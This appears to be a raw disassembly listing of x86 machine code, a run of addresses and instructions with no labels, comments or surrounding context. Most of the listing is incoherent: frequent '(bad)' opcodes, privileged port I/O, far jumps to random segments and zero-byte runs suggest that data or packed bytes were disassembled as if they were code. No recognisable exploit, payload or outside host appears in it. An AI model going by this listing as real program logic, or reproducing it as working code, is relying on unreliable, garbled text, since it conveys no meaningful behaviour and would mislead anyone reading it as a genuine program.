  426c4e:	rcl    BYTE PTR [esi],cl
  426c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c51:	jmp    0x426c40
  426c53:	(bad)  
  426c54:	mov    dl,0x84
  426c56:	jge    0x426cbd
  426c58:	jo     0x426c51
  426c5a:	test   al,0xad
  426c5c:	daa    
  426c5d:	jmp    0x3154:0xf77285b7
  426c64:	jg     0x426c9f
  426c66:	add    al,0xf7
  426c68:	mov    ecx,0xc47fcf70
  426c6d:	aaa    
  426c6e:	add    al,0xb
  426c70:	fldenv [edi]
  426c72:	inc    edx
  426c73:	nop
  426c74:	(bad)  
  426c75:	out    dx,eax
  426c76:	mov    BYTE PTR [ebp-0x6fbc1a96],al
  426c7c:	sbb    esp,DWORD PTR [edi+0x60b26e2d]
  426c82:	inc    eax
  426c83:	ins    BYTE PTR es:[edi],dx
  426c84:	(bad)  
  426c85:	js     0x426c2f
  426c87:	mov    WORD PTR [edi],fs
  426c89:	test   BYTE PTR [ecx-0x74f8d738],cl
  426c8f:	or     BYTE PTR [edi-0x4ca813c1],ch
  426c95:	idiv   DWORD PTR [esi+0x50]
  426c98:	pusha  
  426c99:	loop   0x426c23
  426c9b:	les    ecx,FWORD PTR [esi-0x622abf39]
  426ca1:	fcmovnu st,st(7)
  426ca3:	xchg   DWORD PTR [edi+0xe],edx
  426ca6:	out    0x0,eax
  426ca8:	add    BYTE PTR [eax],al
  426caa:	add    BYTE PTR [eax],al
  426cac:	or     BYTE PTR [edi+0x32],ch
  426caf:	shr    DWORD PTR [edx],1
  426cb1:	push   eax
  426cb2:	in     al,dx
  426cb3:	es and eax,0xf91ed65a
  426cb9:	fcom   DWORD PTR [edi+0x4b7c852a]
  426cbf:	mov    dl,0x10
  426cc1:	out    dx,eax
  426cc2:	sbb    DWORD PTR [ebx],ebp
  426cc4:	nop
  426cc5:	mov    dl,0x7e
  426cc7:	repnz cmp eax,0x45a10e98
  426ccd:	cwde   
  426cce:	push   cs
  426ccf:	jg     0x426d0e
  426cd1:	cwde   
  426cd2:	push   cs
  426cd3:	addr16 out 0x97,al
  426cd6:	push   cs
  426cd7:	outs   dx,DWORD PTR ds:[esi]
  426cd8:	fst    QWORD PTR [edi-0x681a88f2]
  426cde:	push   cs
  426cdf:	jg     0x426cbe
  426ce1:	xchg   edi,eax
  426ce2:	push   cs
  426ce3:	int3   
  426ce4:	lds    edx,FWORD PTR [edi-0x684316f2]
  426cea:	push   cs
  426ceb:	in     al,0xc4
  426ced:	xchg   edi,eax
  426cee:	push   cs
  426cef:	sar    DWORD PTR [edi+edx*4-0x681b31f2],cl
  426cf6:	push   cs
  426cf7:	aad    0xdc
  426cf9:	xchg   edi,eax
  426cfa:	push   cs
  426cfb:	sub    ch,ah
  426cfd:	xchg   edi,eax
  426cfe:	push   cs
  426cff:	aaa    
  426d00:	in     al,0xb0
  426d02:	jmp    0x426c8a
  426d04:	add    al,0x1d
  426d06:	push   es
  426d07:	or     eax,0x7644b250
  426d0c:	scas   al,BYTE PTR es:[edi]
  426d0d:	leave  
  426d0e:	jmp    FWORD PTR [eax]
  426d10:	add    BYTE PTR [eax],al
  426d12:	add    BYTE PTR [eax],al
  426d14:	add    BYTE PTR [edx+ecx*8-0x4d6cca4e],cl
  426d1b:	xchg   ebx,eax
  426d1c:	sub    DWORD PTR [edi+0x6e5644b1],edx
  426d22:	sar    edi,1
  426d24:	test   al,0x93
  426d26:	mov    dh,cl
  426d28:	add    BYTE PTR [edi],dh
  426d2a:	repnz popf 
  426d2c:	add    DWORD PTR [edi],eax
  426d2e:	repnz cmc 
  426d30:	add    esi,DWORD PTR [ebp+esi*4-0x6ebe97f2]
  426d37:	push   edx
  426d38:	add    BYTE PTR [esi-0x38],dh
  426d3b:	hlt    
  426d3c:	adc    bh,cl
  426d3e:	mov    ah,0xad
  426d40:	push   esi
  426d41:	xchg   ecx,eax
  426d42:	arpl   bx,bx
  426d44:	add    BYTE PTR [ecx],ch
  426d46:	sub    bl,dh
  426d48:	push   0x529131
  426d4d:	es (bad) 
  426d4f:	hlt    
  426d50:	adc    ch,cl
  426d52:	mov    ah,0x3d
  426d54:	shr    BYTE PTR [edi+eiz*1-0x5bc66be7],0xad
  426d5c:	push   ebx
  426d5d:	and    DWORD PTR [edx-0x6240f3ce],0xffffff95
  426d64:	bnd jb 0x426d8e
  426d67:	xchg   edx,eax
  426d68:	fld    TBYTE PTR [ebp+0x2695f6b3]
  426d6e:	inc    ebp
  426d6f:	jmp    0x12fd96f8
  426d74:	xor    ch,BYTE PTR [ecx]
  426d76:	cmp    DWORD PTR ds:0xff,esp
  426d7c:	add    BYTE PTR [eax],al
  426d7e:	lods   eax,DWORD PTR ds:[esi]
  426d7f:	retf   0x8b1c
  426d82:	call   FWORD PTR [eax-0x27]
  426d85:	call   0x2bb12f
  426d8a:	xor    bh,BYTE PTR [esi]
  426d8c:	xchg   ebx,eax
  426d8d:	not    BYTE PTR [esi-0x62246f20]
  426d93:	test   eax,0x45269bf6
  426d98:	jmp    0xe06d56d0
  426d9d:	prefetch (bad)
  426d9e:	or     eax,0xed16f4ef
  426da3:	pop    es
  426da4:	bound  edx,QWORD PTR [eax]
  426da6:	nop
  426da7:	jno    0x426e25
  426da9:	sti    
  426daa:	ja     0x426e15
  426dac:	xchg   esi,eax
  426dad:	shl    ch,0xc8
  426db0:	mov    BYTE PTR [eax-0x187e6699],al
  426db6:	push   ebx
  426db7:	pop    edx
  426db8:	adc    ebx,DWORD PTR [ebx-0x4a]
  426dbb:	inc    esp
  426dbc:	ror    DWORD PTR [eax],cl
  426dbe:	nop
  426dbf:	sbb    al,0x27
  426dc1:	sti    
  426dc2:	popf   
  426dc3:	pop    ecx
  426dc4:	in     al,0x3f
  426dc6:	nop
  426dc7:	push   esp
  426dc8:	sub    al,0x66
  426dcb:	ins    BYTE PTR es:[edi],dx
  426dcc:	adc    al,BYTE PTR [eax]
  426dce:	adc    al,0x8a
  426dd0:	push   es
  426dd1:	daa    
  426dd2:	sbb    eax,edi
  426dd4:	shr    BYTE PTR [ebx-0x2c],0xc9
  426dd8:	xchg   ebx,eax
  426dd9:	stc    
  426dda:	pop    ss
  426ddb:	pop    esi
  426ddc:	icebp  
  426ddd:	push   eax
  426dde:	(bad)  
  426de0:	cmp    BYTE PTR [ecx],dl
  426de2:	add    BYTE PTR [eax],al
  426de4:	add    BYTE PTR [eax],al
  426de6:	add    BYTE PTR [eax-0x37],dl
  426de9:	xchg   ebp,eax
  426dea:	rol    BYTE PTR [ebp-0x8fef52a],0xbe
  426df1:	ret    0x546b
  426df4:	leave  
  426df5:	jg     0x426e0c
  426df7:	inc    esp
  426df8:	cli    
  426df9:	push   eax
  426dfa:	add    BYTE PTR ds:0xd395100a,dl
  426e00:	hlt    
  426e01:	adc    ch,BYTE PTR [esi]
  426e03:	jmp    0x426d9c
  426e05:	adc    DWORD PTR ds:0x50dc24,0x571f0d0a
  426e0f:	rcr    DWORD PTR [eax+ebp*1-0x1c867a05],cl
  426e16:	aas    
  426e17:	nop
  426e18:	fs sub eax,0x116bb2
  426e1f:	or     al,0xa
  426e21:	add    eax,0xe2b21b19
  426e26:	sar    ebx,cl
  426e28:	outs   dx,BYTE PTR ds:[esi]
  426e29:	test   DWORD PTR [esi+0x1cad779],0x2be1d7e1
  426e33:	xor    DWORD PTR [edx-0x9],0x42a75088
  426e3a:	(bad)  
  426e3b:	ja     0x426df1
  426e3d:	jmp    0xc21a30f0
  426e42:	outs   dx,DWORD PTR ds:[esi]
  426e43:	sahf   
  426e44:	jb     0x426e3d
  426e46:	jge    0x426e4f
  426e48:	js     0x426e1a
  426e4a:	mov    BYTE PTR [eax],0x0
  426e4d:	add    BYTE PTR [eax],al
  426e4f:	add    dl,ah
  426e51:	xlat   BYTE PTR ds:[ebx]
  426e52:	jmp    0xf7b4f4ca
  426e57:	jle    0x426e79
  426e59:	dec    esp
  426e5a:	not    DWORD PTR [edx+0x479ba25d]
  426e60:	nop
  426e61:	xlat   BYTE PTR ds:[ebx]
  426e62:	leave  
  426e63:	das    
  426e64:	xor    DWORD PTR [edx-0x9],0x93bd0b39
  426e6b:	test   bh,0xb2
  426e6e:	sub    eax,0xd32b65c5
  426e73:	jge    0x426ec2
  426e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e76:	jbe    0x426e18
  426e78:	cwde   
  426e79:	mov    ah,0xf7
  426e7b:	add    eax,DWORD PTR [edx-0x5d]
  426e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e7f:	call   0x5dd9:0x7d0cc290
  426e86:	std    
  426e87:	jl     0x426eee
  426e89:	stos   BYTE PTR es:[edi],al
  426e8a:	js     0x426e50
  426e8c:	je     0x426e10
  426e8e:	jp     0x426f0f
  426e90:	mov    eax,0xa89183d4
  426e95:	ja     0x426e1a
  426e97:	xchg   edx,eax
  426e98:	stos   DWORD PTR es:[edi],eax
  426e99:	sub    al,0xb7
  426e9b:	sbb    BYTE PTR [ebp+0x2b],cl
  426e9e:	in     al,dx
  426e9f:	pop    es
  426ea0:	pop    ecx
  426ea1:	pop    edi
  426ea2:	push   cs
  426ea3:	fnstcw WORD PTR [ecx-0x4b]
  426ea6:	cdq    
  426ea7:	es nop
  426ea9:	dec    esp
  426eaa:	in     eax,dx
  426eab:	jb     0x426e35
  426ead:	push   es
  426eae:	fwait
  426eaf:	ins    BYTE PTR es:[edi],dx
  426eb0:	or     al,0xd8
  426eb2:	in     al,dx
  426eb3:	push   esi
  426eb4:	add    BYTE PTR [eax],al
  426eb6:	add    BYTE PTR [eax],al
  426eb8:	add    BYTE PTR [ebx+edx*2],dl
  426ebb:	cs dec esi
  426ebd:	add    DWORD PTR [eax],esi
  426ebf:	into   
  426ec0:	mov    ebp,0xb6297479
  426ec5:	arpl   WORD PTR [eax-0xf],cx
  426ec8:	ret    
  426ec9:	cmp    edi,DWORD PTR [esp+eax*2+0x2e]
  426ecd:	mov    fs,WORD PTR [bx+di-0x53]
  426ed1:	xchg   ebx,eax
  426ed2:	fld    DWORD PTR [edx]
  426ed4:	cmc    
  426ed5:	inc    esp
  426ed6:	xchg   esi,eax
  426ed7:	push   cs
  426ed8:	push   ds
  426ed9:	in     al,0xbd
  426edb:	into   
  426edc:	push   0xfffffff4
  426ede:	fcom   DWORD PTR [eax+0x4c798e29]
  426ee4:	xor    BYTE PTR [esi-0x55],dl
  426ee7:	push   cs
  426ee8:	mov    edx,0xf4f97353
  426eed:	mov    WORD PTR [ebx+0x16],gs
  426ef0:	out    0x9f,al
  426ef2:	mov    ss,WORD PTR [esi]
  426ef4:	jb     0x426e88
  426ef6:	fldenv [ecx+0xd]
  426ef9:	hlt    
  426efa:	fdivr  DWORD PTR ds:0x1fd48de1
  426f00:	fwait
  426f01:	psllq  mm0,QWORD PTR [esi-0x12]
  426f05:	push   esi
  426f06:	in     al,dx
  426f07:	cwde   
  426f08:	test   al,0xcd
  426f0a:	stos   BYTE PTR es:[edi],al
  426f0b:	push   cs
  426f0c:	push   ss
  426f0d:	dec    ebp
  426f0e:	fistp  DWORD PTR [eax+0x14f19836]
  426f14:	mov    cl,0x3e
  426f16:	jb     0x426f26
  426f18:	ins    BYTE PTR es:[edi],dx
  426f19:	cli    
  426f1a:	pop    esi
  426f1b:	adc    al,0x62
  426f1d:	add    BYTE PTR [eax],al
  426f1f:	add    BYTE PTR [eax],al
  426f21:	add    BYTE PTR [edx+0xe000f4c],dl
  426f27:	loop   0x426f67
  426f29:	lea    esp,[esi-0x19316c27]
  426f2f:	stos   DWORD PTR es:[edi],eax
  426f30:	mov    dl,0x8d
  426f32:	mov    ecx,0x4a6f6ae
  426f37:	inc    esp
  426f38:	jmp    0xd1ef9ec8
  426f3d:	push   es
  426f3e:	jge    0x426f8b
  426f40:	dec    esi
  426f41:	add    cl,dl
  426f43:	pop    ds
  426f44:	push   ebx
  426f45:	add    BYTE PTR [ecx+0x3b],bh
  426f48:	push   edx
  426f49:	and    al,0x6d
  426f4b:	mov    al,0xd1
  426f4d:	pop    es
  426f4e:	pop    ecx
  426f4f:	push   edi
  426f50:	dec    esi
  426f51:	add    BYTE PTR [edi],bl
  426f53:	mov    ebp,0x397e8b11
  426f58:	stos   DWORD PTR es:[edi],eax
  426f59:	inc    ebp
  426f5a:	sub    DWORD PTR [ecx-0x1101386b],esi
  426f60:	adc    DWORD PTR [eax],eax
  426f62:	out    0x99,eax
  426f64:	xchg   ebp,eax
  426f65:	stc    
  426f66:	mov    ds:0x810c3295,al
  426f6b:	mov    edi,0x2c2900fd
  426f70:	into   
  426f71:	je     0x426fbf
  426f73:	push   esi
  426f74:	pop    edx
  426f75:	and    al,0xfd
  426f77:	push   edi
  426f78:	mov    esi,0xe8b7f3e8
  426f7d:	push   DWORD PTR [edx+0x3e]
  426f80:	xchg   ebx,eax
  426f81:	test   BYTE PTR [ebp-0x1e],0x3e
  426f85:	inc    DWORD PTR [eax]
  426f87:	add    BYTE PTR [eax],al
  426f89:	add    BYTE PTR [eax],al
  426f8b:	les    ecx,FWORD PTR [eax]
  426f8d:	sbb    eax,0x5931e940
  426f92:	or     BYTE PTR [edi+0x59],dh
  426f95:	(bad)  
  426f96:	(bad)  
  426f97:	stos   DWORD PTR es:[edi],eax
  426f98:	fisubr WORD PTR [ebx-0x8]
  426f9b:	out    dx,al
  426f9c:	mov    edx,0x35ef8b18
  426fa1:	addr16 inc ebp
  426fa3:	nop
  426fa4:	retf   
  426fa5:	adc    BYTE PTR [esi],ch
  426fa7:	rol    BYTE PTR [ebx-0x347341c4],1
  426fad:	inc    eax
  426fae:	add    DWORD PTR [ebx-0x7f1da5a5],ebp
  426fb4:	add    eax,0x50e5bf6e
  426fb9:	scas   al,BYTE PTR es:[edi]
  426fba:	jg     0x427028
  426fbc:	push   edx
  426fbd:	xchg   ecx,eax
  426fbe:	in     al,dx
  426fbf:	mov    ah,0xb8
  426fc1:	rcl    BYTE PTR [edx+0xb],cl
  426fc4:	jnp    0x427031
  426fc6:	inc    esp
  426fc7:	mov    ah,0xd9
  426fc9:	imul   eax,DWORD PTR [esp+ebp*4-0xb],0xd1b44469
  426fd1:	imul   eax,DWORD PTR [esp+ebp*4-0x5b],0x8c944269
  426fd9:	push   esi
  426fda:	and    al,0x8c
  426fdc:	push   ecx
  426fdd:	pop    DWORD PTR [eax-0x70]
  426fe0:	bound  eax,QWORD PTR [esi]
  426fe2:	and    al,0x88
  426fe4:	push   edx
  426fe5:	push   esi
  426fe6:	and    al,0x9c
  426fe8:	mov    al,0xf4
  426fea:	xchg   dh,dl
  426fec:	lds    ecx,FWORD PTR [ebp+0x54]
  426ff2:	add    BYTE PTR [eax],al
  426ff4:	je     0x426fef
  426ff6:	addr16 add edx,eax
  426ff9:	fsub   QWORD PTR [eax]
  426ffb:	add    al,0x14
  426ffd:	mov    al,BYTE PTR [esi]
  426fff:	cmp    BYTE PTR [edi],al
  427001:	jbe    0x426ff9
  427003:	adc    ecx,DWORD PTR ds:0x507f68e
  427009:	mov    ?,esi
  42700b:	adc    ebx,DWORD PTR [ecx]
  42700d:	mov    ?,esi
  42700f:	adc    edi,eax
  427011:	sbb    BYTE PTR [ebp+0x12fdffb],ah
  427017:	adc    edx,DWORD PTR [eax-0x6447a637]
  42701d:	leave  
  42701e:	adc    al,ch
  427020:	dec    ecx
  427021:	mov    dl,0xe1
  427023:	add    edx,DWORD PTR [eax+0x6fd88c82]
  427029:	pop    edi
  42702a:	cmp    eax,DWORD PTR [ebx+ebp*4]
  42702d:	mov    ebp,0xb267f2e3
  427032:	rol    BYTE PTR [ecx],cl
  427034:	xchg   ecx,eax
  427035:	mov    dl,0xf7
  427037:	pop    ss
  427038:	jecxz  0x4270ae
  42703a:	jo     0x426fe4
  42703c:	in     eax,dx
  42703d:	out    dx,eax
  42703e:	jne    0x426fdf
  427040:	cmp    al,0xad
  427042:	test   DWORD PTR [ebx],0x36a57dcf
  427048:	out    dx,al
  427049:	ret    0x9c70
  42704c:	push   ss
  42704d:	clc    
  42704e:	rol    BYTE PTR [ebx],1
  427050:	mov    ebp,0x7ee7b32a
  427055:	rol    ecx,cl
  427057:	and    eax,DWORD PTR [eax]
  427059:	add    BYTE PTR [eax],al
  42705b:	add    BYTE PTR [eax],al
  42705d:	xor    BYTE PTR [edx-0x9],0x82
  427061:	push   esp
  427062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427063:	jae    0x42700f
  427065:	mov    ebp,0x74576097
  42706a:	jmp    0x170d:0x2d9003f1
  427071:	jns    0x42709a
  427073:	pop    ebx
  427074:	out    0x5b,eax
  427076:	lods   eax,DWORD PTR ds:[esi]
  427077:	test   DWORD PTR [ebx],0xed62d315
  42707d:	push   cs
  42707e:	sti    
  42707f:	outs   dx,DWORD PTR ds:[esi]
  427080:	mov    ebp,0x35875f8
  427085:	nop
  427086:	daa    
  427087:	iret   
  427088:	xchg   edi,esp
  42708a:	push   ebx
  42708b:	cld    
  42708c:	js     0x427071
  42708e:	es mov ch,0x9c
  427091:	rep ins DWORD PTR es:[edi],dx
  427093:	test   DWORD PTR [ebx],0x9679e20f
  427099:	gs imul ebp,eax,0xffffffc3
  42709d:	jmp    0x942b7ea6
  4270a2:	mov    dl,0x1d
  4270a4:	ja     0x427077
  4270a6:	imul   esp,DWORD PTR [edx-0xd],0x60de5d7b
  4270ad:	sti    
  4270ae:	mov    cl,0xe
  4270b0:	jmp    0xa3ea1dbd
  4270b5:	mov    WORD PTR [edx-0x71a78bf2],?
  4270bb:	push   es
  4270bc:	xchg   ecx,eax
  4270bd:	mov    edi,0xe90e81
  4270c2:	add    BYTE PTR [eax],al
  4270c4:	add    BYTE PTR [eax],al
  4270c6:	or     bl,al
  4270c8:	xchg   edx,eax
  4270c9:	ja     0x427073
  4270cb:	out    0x98,eax
  4270cd:	in     eax,0x77
  4270cf:	stos   BYTE PTR es:[edi],al
  4270d0:	cdq    
  4270d1:	ss stc 
  4270d3:	cld    
  4270d4:	cmc    
  4270d5:	out    0xf0,al
  4270d7:	mov    dl,0xe
  4270d9:	bound  esi,QWORD PTR [eax+edi*1]
  4270dc:	leave  
  4270dd:	(bad)  
  4270de:	pop    edx
  4270df:	cmp    esp,ebx
  4270e1:	push   ecx
  4270e2:	call   0x9b0c:0x28e90e76
  4270e9:	popf   
  4270ea:	das    
  4270eb:	scas   al,BYTE PTR es:[edi]
  4270ec:	mul    BYTE PTR [eax]
  4270ee:	mov    bl,0xb2
  4270f0:	push   cs
  4270f1:	ins    BYTE PTR es:[edi],dx
  4270f2:	or     BYTE PTR [edi-0x4d6c1650],dl
  4270f8:	js     0x4270e3
  4270fa:	test   al,0xe5
  4270fc:	cmp    eax,0xdc39e0d2
  427101:	adc    esi,esp
  427103:	and    cl,BYTE PTR [esi]
  427105:	jmp    0x12d55b92
  42710a:	test   al,0x1
  42710c:	mov    fs,WORD PTR [ebp-0x18]
  42710f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427110:	push   cs
  427111:	jb     0x4270a3
  427113:	cmp    DWORD PTR [esi-0xb],ecx
  427116:	push   0x77
  427118:	push   cs
  427119:	push   ebp
  42711a:	fdivr  QWORD PTR [eax]
  42711c:	sbb    DWORD PTR [eax],eax
  42711e:	ror    edi,0x50
  427121:	add    cl,ch
  427123:	dec    edx
  427124:	aad    0xe8
  427126:	mov    esi,0xe79
  42712b:	add    BYTE PTR [eax],al
  42712d:	add    BYTE PTR [eax],al
  42712f:	retf   0x761a
  427132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427133:	lods   al,BYTE PTR ds:[esi]
  427134:	mov    ch,0xe
  427136:	lea    ebp,[ebp-0x26]
  427139:	or     al,0x6a
  42713b:	mov    ecx,0x9915e985
  427140:	enter  0x2c,0x2a
  427144:	stc    
  427145:	sbb    DWORD PTR [ebp+0x5641ba7c],ecx
  42714b:	xchg   ebx,eax
  42714c:	mov    ah,0x47
  42714e:	mov    DWORD PTR [ecx+edx*8-0x6b],edi
  427152:	jge    0x4270d5
  427154:	sub    eax,0x3ed604fa
  427159:	xchg   ebp,eax
  42715a:	ret    
  42715b:	es lahf 
  42715d:	dec    ebx
  42715e:	pop    ebx
  42715f:	clc    
  427160:	stc    
  427161:	mov    eax,ds:0xacb56905
  427166:	or     BYTE PTR [ecx-0x79],ch
  427169:	xchg   ebp,eax
  42716a:	icebp  
  42716b:	mov    dl,0x8f
  42716d:	sbb    ch,al
  42716f:	jp     0x4271e3
  427171:	push   cs
  427172:	add    BYTE PTR [ebx],ah
  427174:	lds    esi,FWORD PTR [edx+0x0]
  427177:	(bad)  
  427178:	cmp    eax,0x752f6003
  42717d:	push   cs
  42717e:	sub    DWORD PTR [ebp-0x2f],0x46
  427182:	ret    
  427183:	cld    
  427184:	dec    ecx
  427185:	cli    
  427186:	add    DWORD PTR [ebp+0x72565be5],0xffffffa8
  42718d:	push   ss
  42718e:	push   edi
  42718f:	jae    0x427208
  427191:	mov    eax,DWORD PTR es:[eax]
  427194:	add    BYTE PTR [eax],al
  427196:	add    BYTE PTR [eax],al
  427198:	push   edi
  427199:	cli    
  42719a:	xchg   esp,eax
  42719b:	inc    ebp
  42719c:	aad    0xcc
  42719e:	sahf   
  42719f:	rcl    BYTE PTR [eax+0x5808fe93],0x66
  4271a6:	in     al,dx
  4271a7:	rcl    DWORD PTR [ebp-0x3d],0xa
  4271ab:	out    0x8c,eax
  4271ad:	sbb    DWORD PTR [edi+0x8],ecx
  4271b0:	cmp    BYTE PTR [ebp+0x12],dh
  4271b3:	sti    
  4271b4:	cmp    eax,0xdcdc2d3
  4271b9:	xchg   BYTE PTR [edx+0x10de3ee8],ah
  4271bf:	add    BYTE PTR [ebx],bl
  4271c1:	fsubr  QWORD PTR [ebx-0x78]
  4271c4:	adc    dl,bl
  4271c6:	adc    BYTE PTR [eax],al
  4271c8:	or     eax,0x550a29e
  4271cd:	cdq    
  4271ce:	push   edx
  4271cf:	push   eax
  4271d0:	out    0x31,al
  4271d2:	cli    
  4271d3:	jmp    0x427165
  4271d5:	fldcw  WORD PTR [ebx-0x8]
  4271d8:	adc    eax,0x770efe59
  4271dd:	out    0x94,eax
  4271df:	xchg   DWORD PTR [ebx+0x11],ebx
  4271e2:	mov    DWORD PTR [eax],ebx
  4271e4:	nop
  4271e5:	fst    DWORD PTR [eax]
  4271e7:	xchg   DWORD PTR [edi+0x478711e3],eax
  4271ed:	xchg   ecx,eax
  4271ee:	in     al,0x86
  4271f0:	pop    esi
  4271f1:	jb     0x427243
  4271f3:	aas    
  4271f4:	nop
  4271f5:	fnstenv [edi]
  4271f7:	pop    edx
  4271f8:	sbb    DWORD PTR [ecx+0xc93d],0x0
  4271ff:	add    BYTE PTR [eax],al
  427201:	push   edx
  427202:	(bad)  
  427203:	adc    BYTE PTR [ebp+0x1b],dl
  427206:	mov    dh,0x23
  427208:	push   ecx
  427209:	mov    esi,0xdf96c08
  42720e:	pop    es
  42720f:	cdq    
  427210:	xchg   DWORD PTR [edi-0x678a67d6],ecx
  427216:	push   esp
  427217:	push   0xffffff80
  427219:	xchg   ecx,eax
  42721a:	fst    DWORD PTR [eax]
  42721c:	call   0x406249e
  427221:	nop
  427222:	ss mov bh,0xf
  427225:	mov    esi,0xf8849cf
  42722a:	add    ah,bl
  42722c:	adc    al,bl
  42722e:	iret   
  42722f:	sub    eax,edi
  427231:	out    dx,eax
  427232:	call   0x8c32:0x3b9003f7
  427239:	(bad)  
  42723b:	into   
  42723c:	add    eax,0x7ef7b27f
  427241:	mov    ebp,DWORD PTR [eax-0x74]
  427244:	adc    BYTE PTR [eax-0x6e7c91c5],bl
  42724a:	mov    dl,0xf7
  42724c:	fwait
  42724d:	out    0xde,al
  42724f:	test   BYTE PTR [ebx],0x67
  427252:	bnd jno 0x4271e6
  427255:	fwait
  427256:	das    
  427257:	mov    bh,0x2a
  427259:	jmp    0x6066:0x7ffbb8f9
  427260:	xchg   edi,eax
  427261:	not    esi
  427263:	outs   dx,BYTE PTR ds:[esi]
  427264:	xchg   BYTE PTR [eax],al
  427266:	add    BYTE PTR [eax],al
  427268:	add    BYTE PTR [eax],al
  42726a:	jl     0x42721a
  42726c:	or     DWORD PTR [esi-0x755b9729],esi
  427272:	in     eax,0xa2
  427274:	pusha  
  427275:	mov    WORD PTR [ebx+0x45],ds
  427278:	sti    
  427279:	js     0x427257
  42727b:	xchg   esi,eax
  42727c:	pop    ss
  42727d:	pushf  
  42727e:	push   0xffffffcd
  427280:	cmp    ecx,DWORD PTR [edx-0x6e863de9]
  427286:	mov    ebp,0x2bbb78ba
  42728b:	fld    DWORD PTR [edx]
  42728d:	add    edx,DWORD PTR [eax+0x68424ab2]
  427293:	xor    DWORD PTR [eax],0x33
  427296:	or     BYTE PTR [esi-0x2d],ch
  427299:	neg    BYTE PTR [eax]
  42729b:	jbe    0x4272ab
  42729d:	int    0xfb
  42729f:	retf   
  4272a0:	add    bh,cl
  4272a2:	add    al,0x8f
  4272a4:	push   cs
  4272a5:	mul    BYTE PTR [ecx+0x75]
  4272a8:	push   ss
  4272a9:	xor    DWORD PTR [eax+0x66e6569b],eax
  4272af:	cmp    BYTE PTR [esi],cl
  4272b1:	jmp    0xe217c249
  4272b6:	push   esp
  4272b7:	mov    bl,0x29
  4272b9:	and    eax,0x3661a6b0
  4272be:	sbb    DWORD PTR [ebp-0x2],eax
  4272c1:	popa   
  4272c2:	outs   dx,DWORD PTR ds:[esi]
  4272c3:	mov    esi,0xb28cb0a7
  4272c8:	push   cs
  4272c9:	xchg   ecx,eax
  4272ca:	mov    edi,0xe90e78
  4272cf:	add    BYTE PTR [eax],al
  4272d1:	add    BYTE PTR [eax],al
  4272d3:	daa    
  4272d4:	repnz popa 
  4272d6:	add    cl,bl
  4272d8:	stos   DWORD PTR es:[edi],eax
  4272d9:	sbb    eax,0x1d96505c
  4272de:	xchg   edx,eax
  4272df:	ror    DWORD PTR [ebp-0x2b],1
  4272e2:	loope  0x4272e8
  4272e4:	mov    dl,0x29
  4272e6:	and    eax,0xbe61a670
  4272eb:	hlt    
  4272ec:	clc    
  4272ed:	cmc    
  4272ee:	lods   al,BYTE PTR ds:[esi]
  4272ef:	mov    ds:0x4c6d0eb2,al
  4272f4:	inc    edi
  4272f5:	pop    edx
  4272f6:	dec    esi
  4272f7:	(bad)  
  4272f8:	mov    ds:0xb5f9c99,al
  4272fd:	fsubr  st,st(1)
  4272ff:	xchg   ebx,eax
  427300:	mov    dl,0xf6
  427302:	dec    ebx
  427303:	jg     0x4272b7
  427305:	push   cs
  427306:	gs push esp
  427308:	inc    edi
  427309:	adc    DWORD PTR es:[ebp+0x1c],edx
  42730d:	in     al,dx
  42730e:	push   ds
  42730f:	mov    ?,WORD PTR [esi-0x5db84265]
  427315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427316:	and    dl,BYTE PTR [edx+esi*4+0x72a0000e]
  42731d:	xor    dl,BYTE PTR [ecx+eiz*4]
  427320:	or     eax,0x4df9005b
  427325:	into   
  427326:	je     0x42730a
  427328:	dec    esi
  427329:	fld1   
  42732b:	mov    eax,0x43ffe938
  427330:	(bad)  
  427331:	cdq    
  427332:	inc    esp
  427333:	xchg   ebp,eax
  427334:	ficomp DWORD PTR [edi+edx*2+0x0]
  427338:	add    BYTE PTR [eax],al
  42733a:	add    BYTE PTR [eax],al
  42733c:	into   
  42733d:	fmul   QWORD PTR [eax+0x16]
  427340:	test   eax,0x3adb3db6
  427345:	or     eax,0xbdfe431a
  42734a:	xor    dl,BYTE PTR [esi+ebp*8]
  42734d:	fdivr  st(4),st
  42734f:	adc    ch,BYTE PTR [ecx-0x4a]
  427352:	cmp    eax,0x804a01c9
  427357:	add    BYTE PTR [ecx-0x5adb8dca],bh
  42735d:	mov    cl,0x6d
  42735f:	sti    
  427360:	test   al,0xbc
  427362:	sbb    eax,0xeac98c80
  427367:	je     0x4273d0
  427369:	dec    edi
  42736a:	inc    edx
  42736b:	and    al,0x5e
  42736d:	dec    esi
  42736e:	fsubr  st,st(0)
  427370:	lods   eax,DWORD PTR ds:[esi]
  427371:	imul   ecx,DWORD PTR [esi],0x0
  427374:	ret    0x99c8
  427377:	dec    esp
  427378:	xchg   ebp,eax
  427379:	fdivrp st(4),st
  42737b:	push   es
  42737c:	iret   
  42737d:	cmp    ch,cl
  42737f:	mov    ebx,DWORD PTR [edi+0x29]
  427382:	fild   DWORD PTR [ecx+0x39]
  427385:	mov    cl,0x95
  427387:	into   
  427388:	shl    ebx,1
  42738a:	dec    esi
  42738b:	add    BYTE PTR [ecx],ch
  42738d:	inc    esp
  42738e:	pop    edx
  42738f:	and    al,0x35
  427391:	sub    DWORD PTR [edx],esp
  427393:	dec    esp
  427394:	cmp    DWORD PTR [ecx+0x490c395],esi
  42739a:	aaa    
  42739b:	push   edi
  42739c:	or     esi,DWORD PTR [esi+0xbe34]
  4273a2:	add    BYTE PTR [eax],al
  4273a4:	add    BYTE PTR [ebx+ebx*8-0x8ab78e1],al
  4273ab:	call   0x51d00b01
  4273b0:	call   DWORD PTR [edx]
  4273b2:	mov    bl,0x9
  4273b4:	je     0x427356
  4273b6:	sub    DWORD PTR [edx],0x74
  4273b9:	xchg   edi,eax
  4273ba:	test   eax,0xdb37e9d2
  4273bf:	adc    BYTE PTR [eax],al
  4273c1:	or     eax,0x93e6fa6a
  4273c6:	inc    esi
  4273c7:	add    ecx,DWORD PTR [eax]
  4273c9:	sbb    ebx,edx
  4273cb:	pop    ds
  4273cc:	push   ebp
  4273cd:	sbb    esi,DWORD PTR [ebx]
  4273cf:	jbe    0x4273d2
  4273d1:	nop
  4273d2:	fstp   TBYTE PTR [ebx]
